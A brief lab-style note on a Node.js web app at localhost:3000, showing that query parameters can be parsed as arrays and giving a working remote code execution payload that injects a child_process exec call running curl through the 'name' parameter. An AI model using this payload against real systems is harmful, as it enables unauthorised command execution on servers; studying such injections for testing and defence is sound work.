## Check for exploit
Node allows variables to be parsed as an array not a string
```
http://localhost:3000/?name[]=&name[]='
```

Becuase of this remote code execution is possible:
```
http://localhost:3000/?name[]=x&name[]=y'-require('child_process').exec('curl+-XPOST+localhost%3A3000+-d+%22Badguys%22')-'
```

We can use this to start a container

